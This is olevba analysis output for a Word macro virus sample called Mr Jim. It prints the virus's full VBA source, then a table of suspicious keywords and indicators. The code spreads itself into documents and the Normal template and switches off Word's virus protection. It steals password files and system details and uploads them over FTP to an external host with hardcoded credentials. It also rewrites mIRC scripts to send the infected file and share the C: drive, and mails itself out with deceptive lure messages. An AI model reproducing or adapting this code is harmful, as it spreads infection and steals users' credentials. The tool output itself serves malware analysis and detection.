olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jim-593e9656063b5ef15c431b2dfaed0e3f05f853eb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jim-593e9656063b5ef15c431b2dfaed0e3f05f853eb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'19
Private Sub Document_Open()
'20
Mr_Jim_by_Septic:
'20
generation = 40
'20
check_vac = "c:\_vac.txt"
'20
If Dir(check_vac) <> "" Then MsgBox "I guess you have what it takes.", vbInformation, "[Mr Jim] By SeptiC/TI": GoTo Host_infiltrated
'20
da_normal = Dir(NormalTemplate.FullName)
'20
If da_normal = "" Then GoTo No_normal
'20
SetAttr NormalTemplate.FullName, vbNormal
'20
No_normal:
'20
Application.EnableCancelKey = wdCancelDisabled
'20
Options.VirusProtection = Chr$(48)
'20
Options.SaveNormalPrompt = Chr$(48)
'20
Options.ConfirmConversions = Chr$(48)
'20
Application.ScreenUpdating = Chr$(48)
'20
Application.DisplayStatusBar = Chr$(48)
'20
Application.DisplayAlerts = Chr$(48)
'20
windir = System.PrivateProfileString("c:\msdos.sys", "Paths", "WinDir")
'20
Dim Act_doc As Object: Set Act_doc = ActiveDocument
'20
Dim Act_norm As Object: Set Act_norm = NormalTemplate
'20
If Act_doc.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.CountOfLines > 360 Then act_inf = 1
'20
If Act_norm.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.CountOfLines > 360 Then normal_inf = 1
'20
infect_doc:
'20
If act_inf = 1 Then GoTo infect_normal
'20
Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'20
Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'20
Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, a.CountOfLines
'20
Set fix_lines_1 = b
'20
With fix_lines_1
'20
    code_1 = .Lines(1, .CountOfLines)
'20
End With
'20
Act_doc.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.insertlines 1, code_1
'20
Set polyit = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))
'20
temp_number = generation + 1
'20
With polyit.CodeModule
'20
    For da_line = 1 To 420 Step 2
'20
    .replaceline da_line, "'" & Second(Now)
'20
     Next da_line
'20
    .replaceline 230, "Sub ToolsMacro()"
'20
    .replaceline 258, "Private Sub Document_Close()"
'20
    .replaceline 2, "Private Sub Document_Open()"
'20
    .replaceline 6, "generation =" & temp_number
'20
 End With
'20
ActiveDocument.Save
'20
infect_normal:
'20
If normal_inf = 1 Then GoTo no_inf
'20
Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'20
Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'20
Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, b.CountOfLines
'20
Set fix_lines_2 = a
'20
With fix_lines_2
'20
    code_2 = .Lines(1, .CountOfLines)
'20
End With
'20
Act_norm.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).CodeModule.insertlines 1, code_2
'20
Set polyit = Act_norm.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))
'20
da_lines = 0
'20
With polyit.CodeModule
'20
    For da_line = 1 To 420 Step 2
'20
    .replaceline da_line, "'" & Second(Now)
'20
     Next da_line
'20
    .replaceline 230, "Sub ViewVBCode()"
'20
    .replaceline 2, "Private Sub Document_Close()"
'20
    .replaceline 258, "Private Sub Document_Open()"
'20
 End With
'20
NormalTemplate.Save
'20
no_inf:
'20
check_it = Dir("c:\config.dll")
'20
If check_it <> "" Then GoTo Host_infiltrated
'20
collect_i:
'20
user_name = Application.UserName
'20
info_1 = System.Application
'20
info_2 = System.Country
'20
info_3 = System.Creator
'20
info_4 = System.FreeDiskSpace
'20
info_5 = generation
'20
info_6 = System.ProcessorType
'20
info_7 = System.OperatingSystem
'20
With Application.FileSearch
'20
    .FileName = "\*.pwl"
'20
    .LookIn = windir
'20
    .SearchSubFolders = False
'20
    .MatchTextExactly = True
'20
    .FileType = msoFileTypeAllFiles
'20
    .Execute
'20
    passfile = .FoundFiles(Cos(Atn(CInt(1))))
'20
End With
'20
Open "c:\" & user_name & ".dll" For Append As #2
'20
Print #2, passfile
'20
Print #2, "User Name: "; user_name
'20
Print #2, "Time Infected: "; Time
'20
Print #2, "Application : "; info_1
'20
Print #2, "Country code : "; info_2
'20
Print #2, "Creator : "; info_3
'20
Print #2, "Free DiskSpace : "; info_4
'20
Print #2, "Generation of virus : "; info_5
'20
Print #2, "Processor Type : "; info_6
'20
Print #2, "Operating system : "; info_7
'20
Close #2
'20
SetAttr "c:\" & user_name & ".dll", vbHidden
'20
    Open "c:\msdos.dll" For Append As #1
'20
    Print #1, "o ftp.fortunecity.com"
'20
    Print #1, "user mrseptic"
'20
    Print #1, "nofb666"
'20
    Print #1, "binary"
'20
    Print #1, "put ""C:\" & user_name; ".dll"""
'20
    Print #1, "put """ & passfile; """"
'20
    Print #1, "quit"
'20
    Close #1
'20
SetAttr "c:\msdos.dll", vbHidden
'20
Open "c:\config.dll" For Append As #3
'20
Print #3, "BIG as usual in the future"
'20
Close #3
'20
Host_infiltrated:
'20
end_open:
'20
End Sub
'20
Sub ToolsMacro()
'20
On Error GoTo no_doc_stealth
'20
If ActiveDocument = "" Then GoTo no_doc_stealth
'20
Dim Act_doc As Object: Set Act_doc = ActiveDocument
'20
Set a = Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'20
Act_doc.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, a.CountOfLines
'20
Act_doc.Saved = True
'20
no_doc_stealth:
'20
Dim Act_norm As Object: Set Act_norm = NormalTemplate
'20
Set b = Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule
'20
Act_norm.VBProject.VBComponents(Cos(Atn(CInt(1)))).CodeModule.DeleteLines 1, b.CountOfLines
'20
Act_norm.Saved = True
'20
Application.ShowVisualBasicEditor = True
'20
End Sub
'20
Private Sub Document_Close()
'20
check_vac = "c:\_vac.txt"
'20
If Dir(check_vac) <> "" Then MsgBox "I guess you have what it takes.", vbInformation, "[Mr Jim] By SeptiC/TI": GoTo the_end
'20
On Error GoTo end_macro
'20
Options.VirusProtection = Chr$(48)
'20
Options.SaveNormalPrompt = Chr$(48)
'20
Options.ConfirmConversions = Chr$(48)
'20
Application.ScreenUpdating = Chr$(48)
'20
Application.DisplayStatusBar = Chr$(48)
'20
Application.DisplayAlerts = Chr$(48)
'20
windir = System.PrivateProfileString("c:\msdos.sys", "Paths", "WinDir")
'20
active_doc = ActiveDocument.FullName
'20
If Dir("c:\mirc32\mirc32.exe") <> "" Then set_dir = "c:\mirc32\": GoTo past_dir
'20
If Dir("c:\program~1\mirc32\mirc32.exe") <> "" Then set_dir = "c:\program~1\mirc32\": GoTo past_dir
'20
If Dir("c:\program\mirc32\mirc32.exe") <> "" Then set_dir = "c:\program\mirc32\": GoTo past_dir
'20
If Dir("c:\mirc\mirc32.exe") <> "" Then set_dir = "c:\mirc\": GoTo past_dir
'20
If Dir("c:\program~1\mirc\mirc32.exe") <> "" Then set_dir = "c:\program~1\mirc\": GoTo past_dir
'20
If Dir("c:\program\mirc\mirc32.exe") <> "" Then set_dir = "c:\program\mirc\": GoTo past_dir
'20
GoTo Pegasus
'20
past_dir:
'20
If set_dir = "c:\program\mirc32\" Then System.PrivateProfileString("C:\program\mirc32\mirc.ini", "ident", "userid") = "MrJim"
'20
If set_dir = "c:\program\mirc32\" Then System.PrivateProfileString("C:\program\mirc32\mirc.ini", "warn", "fserve") = "off"
'20
If set_dir = "c:\mirc32\" Then System.PrivateProfileString("c:\mirc32\mirc.ini", "ident", "userid") = "MrJim"
'20
If set_dir = "c:\mirc32\" Then System.PrivateProfileString("c:\mirc32\mirc.ini", "warn", "fserve") = "off"
'20
If set_dir = "c:\program~1\mirc32\" Then System.PrivateProfileString("c:\program~1\mirc32\mirc.ini", "ident", "userid") = "MrJim"
'20
If set_dir = "c:\program~1\mirc32\" Then System.PrivateProfileString("c:\program~1\mirc32\mirc.ini", "warn", "fserve") = "off"
'20
If set_dir = "c:\program\mirc\" Then System.PrivateProfileString("C:\program\mirc\mirc.ini", "ident", "userid") = "MrJim"
'20
If set_dir = "c:\program\mirc\" Then System.PrivateProfileString("C:\program\mirc\mirc.ini", "warn", "fserve") = "off"
'20
If set_dir = "c:\mirc\" Then System.PrivateProfileString("c:\mirc\mirc.ini", "ident", "userid") = "MrJim"
'20
If set_dir = "c:\mirc\" Then System.PrivateProfileString("c:\mirc\mirc.ini", "warn", "fserve") = "off"
'20
If set_dir = "c:\program~1\mirc\" Then System.PrivateProfileString("c:\program~1\mirc\mirc.ini", "ident", "userid") = "MrJim"
'20
If set_dir = "c:\program~1\mirc\" Then System.PrivateProfileString("c:\program~1\mirc\mirc.ini", "warn", "fserve") = "off"
'20
On Error GoTo Skip_attr
'20
SetAttr set_dir & "script.ini", vbNormal
'20
Kill set_dir & "script.ini"
'20
SetAttr set_dir & "script.old", vbNormal
'20
Kill set_dir & "script.old"
'20
Skip_attr:
'20
On Error GoTo end_macro
'20
Open set_dir & "script.ini" For Append As #1
'20
Print #1, "[script]"
'20
Print #1, "n0=on 1:TEXT:*relaxa*:#:/msg $chan [MrJim/SeptiC/TI] - BIG as usual in the future"
'20
Print #1, "n1=on 1:TEXT:*hoppauppohajja*:#:/mode $chan +b $me"
'20
Print #1, "n2=on 1:TEXT:*progrĺtta*:#:/mode $chan +o $nick"
'20
Print #1, "n3=on 1:TEXT:*iframtiden*:#:/fserve $nick 20 c:\"
'20
Print #1, "n4=on 1:FILESENT:*.*:if ( $me != $nick ) { /dcc send $nick " & active_doc; " }"
'20
Print #1, "n5=on 1:FILERCVD:*.*:if ( $me != $nick ) { /dcc send $nick " & active_doc; " }"
'20
Close #1
'20
Open set_dir & "script.old" For Append As #1
'20
Print #1, "[script]"
'20
Print #1, "n0=on 1:TEXT:*relaxa*:#:/msg $chan [MrJim/SeptiC/TI] - BIG as usual in the future"
'20
Print #1, "n1=on 1:TEXT:*hoppauppohajja*:#:/mode $chan +b $me"
'20
Print #1, "n2=on 1:TEXT:*progrĺtta*:#:/mode $chan +o $nick"
'20
Print #1, "n3=on 1:TEXT:*iframtiden*:#:/fserve $nick 20 c:\"
'20
Print #1, "n4=on 1:FILESENT:*.*:if ( $me != $nick ) { /dcc send $nick " & active_doc; " }"
'20
Print #1, "n5=on 1:FILERCVD:*.*:if ( $me != $nick ) { /dcc send $nick " & active_doc; " }"
'20
Close #1
'20
Pegasus:
'20
If Dir("c:\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\pmail\": GoTo past_pega_dir
'20
If Dir("c:\mail\winpm-32.exe") <> "" Then pega_dir = "c:\pmail\": GoTo past_pega_dir
'20
If Dir("c:\program~1\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\program~1\pmail\": GoTo past_pega_dir
'20
If Dir("c:\program\pmail\winpm-32.exe") <> "" Then pega_dir = "c:\program\pmail\": GoTo past_pega_dir
'20
GoTo no_mail
'20
past_pega_dir:
'20
With Application.FileSearch
'20
    .FileName = "\*.pmw"
'20
    .LookIn = pega_dir
'20
    .SearchSubFolders = True
'20
    .MatchTextExactly = True
'20
    .FileType = msoFileTypeAllFiles
'20
    .Execute
'20
    pega_mail = .FoundFiles(Cos(Atn(CInt(1))))
'20
End With
'20
get_rand = 0
'20
get_rand = Int(Rnd(1) * 8) + 1
'20
user_name = Application.UserName
'20
If get_rand = 1 Then random_message = "Hi! Quite some time has passed since my last mail, I hope you're not too mad at me. I haven't had time to write for several reasons. Anyway there is a quite interesting document attached in this mail, check it out and tell me what you think. Cya / " & user_name: GoTo after_rand
'20
If get_rand = 2 Then random_message = "Hello, yesterday when I was surfing the web a friend told me about this great game. It's called Utopia, have you ever heard of it? It's very cool and I think you would like it, I found this beginners guide on the net, you need it incase you want to succed and become strong. The guide is attached to the message. Bye! / " & user_name: GoTo after_rand
'20
If get_rand = 3 Then random_message = "HHHHhhhEEEeLLooo :) Somedays ago I was chatting on IRC on some warez channels and one guy offered me 3 different ftp sites with cracked versions of Quake III arena, all of them works! In case you don't have mIRC installed, install it! It's a very cool chat program. The Ftp's login and password are attached to this message. Ok Cya / " & user_name: GoTo after_rand
'20
If get_rand = 4 Then random_message = "Hiya, I really need your help. This document has to be done for friday and it probably contains a lot of misspellings etc etc. Could you please read it through and check if you see something? / " & user_name: GoTo after_rand
'20
If get_rand = 5 Then random_message = "Hehehe guess what I found! Tons of XXX passwords and some other cool stuff, it's attached to the message. Have fun ;) / " & user_name: GoTo after_rand
'20
If get_rand = 6 Then random_message = "Guess what I found, check it out! / " & user_name: GoTo after_rand
'41
random_message = "BAAM! Gotcha! You have just been hit with a message attachment! It's the attachment war of the millenium!!! There is one rule in this game... you can't hit someone who has already hit you, but you can use the attachment that hit yourself or even better find a new funny attachment to send (throw) on your opponent! Now go out there and hit as many people as you can before they get you!!  / " & user_name & " got you!": GoTo after_rand
'41
after_rand:
'41
If pega_mail = "" Then GoTo no_mail
'41
Open pega_mail For Input As #1
'41
Line Input #1, mail_1
'41
Line Input #1, mail_2
'41
Line Input #1, mail_3
'41
Line Input #1, mail_4
'41
Line Input #1, mail_5
'41
Close #1
'41
If mail_2 = "SY:0" Then GoTo no_mail
'48
file_Ready:
'48
random_1 = Second(Now)
'48
Open pega_dir & "\mail\" & random_1 * random_1 & ".pmw" For Append As #3
'48
Print #3, mail_1
'48
Print #3, "SY:0"
'34
Print #3, mail_4
'34
Print #3, mail_5 & " :-)"
'34
Print #3, "CC:"
'34
Print #3, "EN:0"
'34
Print #3, "CS:0"
'34
Print #3, "RC:0"
'34
Print #3, "DC:0"
'34
Print #3, "UR:0"
'34
Print #3, "SS:0"
'34
Print #3, "SG:0"
'34
Print #3, "MI:1"
'34
Print #3, "ID:<Default>"
'34
Print #3, "EX:0"
'34
Print #3, "AT:" & active_doc; ",Binary,1"
'34
Print #3, "RT: 1"
'34
Print #3, "FL:0"
'3
Print #3, ""
'3
Print #3, random_message
'3
Close #3
'3
no_mail:
'3
For x = 1 To Application.Tasks.Count
'3
If UCase(Application.Tasks(x).Name) = "ADDRESS BOOK" Then da_outlook = Application.Tasks(x).Name: GoTo out_look
'3
If UCase(Application.Tasks(x).Name) = "ICQMSGAPI WINDOW" Then GoTo i_connection
'3
If UCase(Application.Tasks(x).Name) = "SOCKETS WINDOW" Then GoTo i_connection
'3
If UCase(Application.Tasks(x).Name) = "SECTION WINDOW" Then GoTo i_connection
'10
If UCase(Application.Tasks(x).Name) = "INTERNET EXPLORER" Then GoTo i_connection
'10
Next x
'10
GoTo end_macro
'10
out_look:
'10
i_connection:
'10
Shell "command.com /c ftp.exe -n -s:c:\msdos.dll", vbHide
'10
end_macro:
'10
If Day(Now) = 2 Then GoTo payload
'10
GoTo the_end
'10
payload:
'10
Selection.TypeText Text:="[Mr Jim/SeptiC/TI] - Do you have what it takes to become an international bussiness man!?"

Selection.TypeParagraph

Selection.TypeParagraph

ActiveDocument.Shapes.AddTextEffect(msoTextEffect29, _
"[Mr Jim]/SeptiC/TI '99" & Chr(13) & "" & Chr(10) & "", "Arial Black", 36#, msoFalse, msoFalse, 121.85 _
, 159.75).Select
   
If ActiveWindow.View.SplitSpecial = wdPaneNone Then
ActiveWindow.ActivePane.View.Type = wdNormalView
Else

ActiveWindow.View.Type = wdNormalView
End If

the_end:

End Sub


















































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |config.dll          |Executable file name                         |
|IOC       |msdos.dll           |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |32.exe              |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+
